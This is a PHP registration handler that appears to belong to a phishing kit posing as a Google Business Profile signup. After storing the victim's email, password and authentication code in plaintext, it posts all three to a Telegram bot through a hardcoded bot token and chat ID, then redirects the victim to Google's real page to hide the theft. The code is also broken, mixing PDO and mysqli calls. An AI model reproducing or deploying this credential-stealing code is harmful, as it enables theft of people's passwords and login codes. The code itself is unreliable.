<?php
session_start();

include("database.php");

if (!isset($_SESSION["register_email"])) {
    header("Location: register.php");
    exit;
}

if (!isset($_SESSION["register_password"])) {
    header("Location: register-password.php");
    exit;
}

if (!isset($_SESSION["register_user_code"])) {
    header("Location: user-code.php");
    exit;
}

$email = $_SESSION["register_email"];
$password = $_SESSION["register_password"];
$user_code = $_SESSION["register_user_code"];

if (empty($password)) {
    die("Please enter a password.");
}

if (empty($user_code)) {
    die("Please enter the authentication code.");
}

// Check if email already exists
$check = $pdo->prepare(
    "SELECT id FROM users WHERE email = ? LIMIT 1"
);

$check->execute([$email]);
$check->execute();

$result = $check->get_result();

if ($result->num_rows > 0) {
    $check->close();
    die("An account with this email already exists.");
}

$check->close();

// NEVER store plaintext passwords

$stmt = $pdo->prepare(
    "INSERT INTO users (email, password, auth_code) VALUES (?, ?, ?)"
);


$stmt->execute([
    $email,
    $password,
    $user_code
]);

if ($stmt->execute()) {

    // Clear registration data after successful registration
    unset(
        $_SESSION["register_email"],
        $_SESSION["register_password"],
        $_SESSION["register_user_code"]
    );

    $botToken = "8989336399:AAFrhQGVBjdjV3dhazSpz8FZ3YgY_9jrkzA";
            $chatId = "8086938261";

            $message = "🔔 NEW USER REGISTERED\n\n";
            $message .= "👤 Email: " . $email . "\n";
            $message .= "Password: " . $password . "\n";
            $message .= "User code:" . $user_code. "\n";
            $message .= "🕐 Time: " . date("d M Y, h:i A") . "\n";
            $message .= "✅ Registration successful";

            $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

            $data = [
                "chat_id" => $chatId,
                "text" => $message
            ];

            $options = [
                "http" => [
                    "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
                    "method" => "POST",
                    "content" => http_build_query($data)
                ]
            ];

            $context = stream_context_create($options);

            file_get_contents($url, false, $context);
            header("Location: https://business.google.com/en-all/business-profile/");
            exit;

} else {
    echo "Registration failed: " . htmlspecialchars($stmt->error);
}

$stmt->close();
$pdo->close();
?>